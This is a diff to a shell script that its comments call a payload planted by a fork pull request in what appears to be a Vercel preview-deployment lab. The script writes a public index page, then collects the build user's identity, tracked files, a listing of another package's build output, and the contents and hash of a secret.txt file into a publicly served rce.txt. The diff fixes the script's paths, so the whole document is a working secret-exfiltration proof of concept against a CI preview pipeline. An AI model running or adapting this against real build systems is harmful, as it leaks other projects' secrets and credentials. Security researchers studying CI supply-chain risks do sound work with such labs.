@@ -1,8 +1,10 @@
 #!/bin/sh
 # Payload introduced ONLY by the fork PR. It names no artifact hash and
 # makes no API call: it just reads what the build tool put on disk.
-mkdir -p public
-echo '<h1>Vercel preview lab</h1><p><a href="/rce.txt">/rce.txt</a></p>' > public/index.html
+# (turbo runs this with cwd = packages/probe, so the deploy output dir is ../../public)
+OUT=../../public
+mkdir -p "$OUT"
+echo '<h1>Vercel preview lab</h1><p><a href="/rce.txt">/rce.txt</a></p>' > "$OUT/index.html"
 {
   echo "== fork-PR preview build =="
   id
@@ -16,11 +18,11 @@ echo '<h1>Vercel preview lab</h1><p><a href="/rce.txt">/rce.txt</a></p>' > publi
   git ls-files packages/vault | sed 's/^/  tracked: /'
   echo
   echo "== what the build tool left in packages/vault/out =="
-  ls -la packages/vault/out 2>&1 | sed 's/^/  /'
+  ls -la ../vault/out 2>&1 | sed 's/^/  /'
   echo -n "  secret.txt -> "
-  cat packages/vault/out/secret.txt 2>&1
+  cat ../vault/out/secret.txt 2>&1
   echo -n "  sha256 -> "
-  sha256sum packages/vault/out/secret.txt 2>&1
-} > public/rce.txt
+  sha256sum ../vault/out/secret.txt 2>&1
+} > "$OUT/rce.txt"
 sleep 2
-cat public/rce.txt
+cat "$OUT/rce.txt"
